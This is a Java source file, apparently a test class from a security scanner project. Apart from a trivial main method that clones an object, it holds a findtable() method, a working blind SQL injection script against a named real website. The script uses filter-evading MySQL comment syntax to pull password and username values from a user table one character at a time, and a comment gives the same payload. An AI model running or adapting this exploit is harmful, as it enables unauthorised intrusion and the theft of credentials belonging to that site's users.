package com.trackray.scanner.httpclient;

import com.trackray.scanner.annotation.Plugin;
import com.trackray.scanner.annotation.Rule;
import com.trackray.scanner.attack.FuzzDir;
import com.trackray.scanner.attack.FuzzDomain;
import com.trackray.scanner.attack.Nmap;
import com.trackray.scanner.attack.Payload;
import com.trackray.scanner.bean.*;
import com.trackray.scanner.controller.DispatchController;
import com.trackray.scanner.enums.HttpMethod;
import com.trackray.scanner.handle.Shell;
import com.trackray.scanner.handle.TaskScheduler;
import com.trackray.scanner.plugin.AbstractPlugin;
import com.trackray.scanner.utils.*;
import net.sf.json.JSONObject;
import org.apache.commons.io.FileUtils;
import org.apache.http.Header;
import org.apache.http.HttpException;
import org.apache.log4j.Appender;
import org.apache.log4j.Logger;
import org.apache.log4j.WriterAppender;
import org.apache.log4j.net.SyslogAppender;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLEncoder;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;



import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Test {
    public static void main(String[] args) throws IOException, InterruptedException, HttpException {

        CrawlerPage crawlerPage = new CrawlerPage();

        CrawlerPage clone = crawlerPage.clone();

        System.out.println(crawlerPage);

        System.out.println(clone);
    }


    public static void findtable() throws IOException, HttpException {
        for (int j=0;j<5;j++){
            String sql = "(/*!10444select*/ concat(user_pass,user_name) /*!43555from*/lzh_ausers limit "+j+",1)";
            //http://www.bspeizi.com/help/fram/type_nid/aylxjj')and mid(user(),1,1)='r'%23
            StringBuffer data = new StringBuffer();
            //String sql ="database()";
            String flag = "按月利息";
            String s = ",_qwertyuiopasdfghjklzxcvbnm";
            String S = s.toUpperCase();
            String n = "1234567890";
            int len = 1;
            for (int i=1;i<999;i++){
                HttpClient client = new HttpClient();
                ResponseStatus ps = client.get("http://www.bspeizi.com/help/fram/?type_nid=aylxjj')and length("+sql+")!="+i+"%23");
                String content = ps.getContent();
                if (!content.contains(flag)){
                    len = i;
                    System.out.println("length:"+len);
                    break;
                }
            }
            if (len>0){
                for (int i=1;i<=len;i++){
                    for (char c : ( s+n).toCharArray()) {
                        HttpClient client = new HttpClient();
                        ResponseStatus ps = client.get("http://www.bspeizi.com/help/fram/?type_nid=aylxjj')and mid("+sql+","+i+",1)='"+c+"'%23");
                        String content = ps.getContent();
                        if (content.contains(flag)){
                            data.append(c);
                            System.out.print(i+":"+c);
                            break;
                        }
                    }

                }
                System.out.println();
                System.out.println(data);
            }

        }
    }

}
